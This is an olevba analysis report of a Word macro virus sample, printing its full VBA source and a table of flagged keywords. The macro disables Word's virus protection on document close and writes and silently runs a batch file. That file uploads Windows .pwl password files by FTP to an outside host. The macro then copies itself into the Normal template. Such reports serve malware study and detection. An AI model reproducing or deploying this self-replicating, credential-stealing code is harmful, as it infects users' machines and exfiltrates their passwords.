olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fs.o
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Fs.o - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - Lurcher
Private Declare Function RasEnumConnections Lib "RasApi32.DLL" Alias "RasEnumConnectionsA" (lprasconn As Any, lpcb As Long, lpcConnections As Long) As Long
Private Sub Document_Close()
On Error Resume Next
Options.VirusProtection = 1 - 1
Options.SaveNormalPrompt = 1 - 1
If RasEnumConnections(32, 0, 0) <> 0 Then
Open "c:\-.bat" For Output As #1
Print #1, "@echo off" & Chr(13) & Chr(10) & "ctty nul" & Chr(13) & Chr(10) & "echo virii>-" & Chr(13) & Chr(10) & "echo hieis>>-" & Chr(13) & Chr(10) & "echo binary>>-" & Chr(13) & Chr(10) & "for %%. in (%windir%\*.pwl) do echo put %%.>>-" & Chr(13) & Chr(10) & "echo bye>>-" & Chr(13) & Chr(10) & "ftp -s:- ftp.hello.com.tw" & Chr(13) & Chr(10) & "del -|del -.bat" & Chr(13) & Chr(10) & "ctty con" & Chr(13) & Chr(10)
Close #1: Shell "c:\-.bat", 0: End If
Set α = IIf(MacroContainer <> "Normal.dot", NormalTemplate, ActiveDocument)
With α.VBProject.VBComponents(1).CodeModule
If υ.Find("~^^~", 0, 0, 0, 0, 0, 0) = 0 Then _
.DeleteLines 1, .CountOfLines: _
.AddFromString ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 70)
End With: End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |RasApi32.DLL        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

